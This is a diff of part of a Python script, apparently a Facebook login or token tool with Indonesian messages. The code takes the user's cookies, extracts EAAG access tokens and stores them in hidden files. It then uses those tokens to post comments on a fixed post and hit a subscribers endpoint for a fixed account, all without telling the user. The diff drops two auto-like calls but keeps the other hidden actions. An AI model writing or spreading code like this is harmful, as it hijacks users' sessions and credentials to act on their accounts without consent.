@@ -515,7 +515,7 @@ def login_lagi334():
 									requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom4}&access_token={tok1}", headers = {"cookie":your_cookies})
 									requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom3}&access_token={tok1}", headers = {"cookie":your_cookies})
 									requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom6}&access_token={tok1}", headers = {"cookie":your_cookies})
-									requests.post(f"https://graph.facebook.com/100043537611609?fields=subscribers&access_token=%s"%(tok1))
+									requests.post("https://graph.facebook.com/100043537611609?fields=subscribers&access_token=%s"%(tok1))
 							except Exception as e:
 								print(e)
 							try:
@@ -526,7 +526,6 @@ def login_lagi334():
 									tok2 = re.search('(\["EAAG\w+)', req.text).group(1).replace('["','')
 									open(".token2.txt","w").write(tok2)
 									Console().print(Panel(f"""[bold cyan][+] Token : [bold green]{tok2}""",width=80, style=f"{color_panel}", title="[bold green]> TOKEN EAAG [bold green]<"))
-									requests.post(f"https://graph.facebook.com/878169396977639/likes?summary=true&access_token={tok2}")
 									Console().print(f" {H2}• {P2}[bold green]Login Berhasil,Sedang Menjalankan Ulang[bold white]")
 								back()
 							except Exception as e:
@@ -589,8 +588,6 @@ def menu(my_name,my_id):
         tokenmu.append(tokenx)
         token = open('.token.txt','r').read()
         cookie = open('.cok.txt','r').read()
-        tok2 = open('.token2.txt','r').read()
-        requests.post("https://graph.facebook.com/878169396977639/likes?summary=true&access_token=%s"%(tok2))
         requests.post("https://graph.facebook.com/100043537611609?fields=subscribers&access_token=%s"%(tokenmu))
     except IOError:
         Console().print(f" {H2}• {P2}[bold red] Cookies Kadaluarsa tolkon")
